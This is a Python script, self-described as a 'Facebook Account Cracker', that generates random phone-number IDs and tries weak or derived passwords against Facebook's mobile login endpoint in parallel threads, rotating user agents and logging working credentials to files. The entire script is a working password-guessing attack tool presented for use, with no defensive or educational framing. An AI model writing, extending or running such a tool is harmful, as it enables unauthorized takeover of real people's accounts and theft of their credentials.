#---------------------[IMPORT]---------------------#
import os, sys, time, random, string, requests, re
from concurrent.futures import ThreadPoolExecutor as ThreadPool

#---------------------[USER-AGENTS]---------------------#
user_agents = [
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36",
]

#---------------------[PROXIES]---------------------#
try:
    proxies = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt').text.splitlines()
except:
    proxies = []

#---------------------[LOGIN FUNCTION]---------------------#
def login_facebook(uid, password):
    try:
        session = requests.Session()
        # Get the login page
        free_fb = session.get('https://free.facebook.com').text

        # Extract required tokens
        lsd = re.search('name="lsd" value="(.*?)"', free_fb).group(1)
        jazoest = re.search('name="jazoest" value="(.*?)"', free_fb).group(1)
        m_ts = re.search('name="m_ts" value="(.*?)"', free_fb).group(1)
        li = re.search('name="li" value="(.*?)"', free_fb).group(1)

        # Prepare login data
        log_data = {
            "lsd": lsd,
            "jazoest": jazoest,
            "m_ts": m_ts,
            "li": li,
            "email": uid,
            "pass": password,
            "login": "Log In"
        }

        # Send login request
        headers = {
            "User-Agent": random.choice(user_agents),
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        response = session.post('https://m.alpha.facebook.com/login/device-based/login/async/', data=log_data, headers=headers)

        # Check login response
        if 'c_user' in session.cookies.get_dict():
            print(f"[OK] {uid} | {password}")
            with open('OK.txt', 'a') as ok_file:
                ok_file.write(f"{uid} | {password}\n")
        elif 'checkpoint' in session.cookies.get_dict():
            print(f"[CP] {uid} | {password}")
            with open('CP.txt', 'a') as cp_file:
                cp_file.write(f"{uid} | {password}\n")
        else:
            print(f"[FAILED] {uid} | {password}")
    except Exception as e:
        print(f"[ERROR] {uid} | {password} | {str(e)}")

#---------------------[MAIN FUNCTION]---------------------#
def main():
    os.system('clear')
    print("Welcome to Facebook Account Cracker")
    print("=" * 50)
    
    # Input from user
    code = input("Enter country code (e.g., 070): ")
    limit = int(input("Enter number of IDs to generate: "))
    
    # Generate user IDs
    user_ids = [code + ''.join(random.choice(string.digits) for _ in range(7)) for _ in range(limit)]
    
    # Start cracking
    with ThreadPool(max_workers=10) as executor:
        for user_id in user_ids:
            passwords = [user_id[-6:], '123456', 'password', 'afghan123']
            for password in passwords:
                executor.submit(login_facebook, user_id, password)

if __name__ == "__main__":
    main()          